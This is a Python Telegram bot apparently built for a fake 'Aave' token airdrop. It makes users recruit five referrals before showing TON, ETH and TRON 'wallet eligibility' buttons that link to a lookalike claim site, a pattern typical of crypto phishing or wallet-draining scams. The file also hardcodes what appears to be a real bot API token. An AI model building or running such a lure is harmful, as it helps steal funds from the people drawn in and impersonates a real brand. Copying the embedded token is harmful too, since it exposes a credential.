from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from db_handler import init_db, add_or_update_user, update_referrals, get_user_data, get_user_id_by_username


# Function to handle button click
async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    username = query.from_user.username

    # Get updated referral count
    referrals = get_user_data(user_id)

    # Check if the user has 5 or more referrals
    if query.data == 'generate_referral':
        # Generate and send referral link
        referral_link = f"https://t.me/AaveTokenbot-start=referral_{username}"
        await query.answer()
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Your referral link is: {referral_link}")
    elif referrals >= 5:
        # Redirect to your website if the user has enough referrals
        await query.answer()
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Congratulations! You have {referrals} referrals. you can now check wallet eligibility:",
                                      reply_markup=InlineKeyboardMarkup([
                                          [InlineKeyboardButton("TON", url='https://aavetoks-claim.site'),
                                           InlineKeyboardButton("ETH", url='https://aavetoks-claim.site'),
                                           InlineKeyboardButton("TRON", url='https://aavetoks-claim.site')],
                                          [InlineKeyboardButton("Join Channel", url='https://t.me/JoinAave')]
                                      ]))
    else:
        # If the user has less than 5 referrals, inform them
        await query.answer(text="You need at least 5 referrals to access these tabs.")

# Function to handle /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username

    # Check for referral
    if context.args:
        referrer_username = context.args[0].split('_')[-1]  # Extract referrer username from start parameter
        if referrer_username != username:  # Avoid self-referral
            referrer_user_id = get_user_id_by_username(referrer_username)
            if referrer_user_id:
                update_referrals(referrer_user_id)  # Update referral count for the referrer

    # Add or update user in the database
    add_or_update_user(user_id, username)

    # Check the referral count
    referrals = get_user_data(user_id)

    # Show message and buttons based on referral count
    keyboard = [
        [InlineKeyboardButton("Generate Referral Link", callback_data='generate_referral')],
        [InlineKeyboardButton("TON", callback_data='ton'),
         InlineKeyboardButton("ETH", callback_data='eth'),
         InlineKeyboardButton("TRON", callback_data='tron')],
        [InlineKeyboardButton("Join Channel", url='https://t.me/JoinAave')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Send image with the airdrop description
    with open('/root/aavebot/bot/aaveicon.jpg', 'rb') as img:  # Replace 'airdrop.jpg' with your file path and name
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=InputFile(img), caption=f"Welcome! You currently have {referrals} referrals. Invite 5 friends to unlock your claim.", reply_markup=reply_markup)

def main():
    application = ApplicationBuilder().token("7212377554:AAEQhO0o3djcL03N_vCtlwD48IBrLK-2yIg").build()

    # Initialize the database
    init_db()

    # Register command and button handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_click_handler))

    # Run the bot
    application.run_polling()

if __name__ == '__main__':
    main()
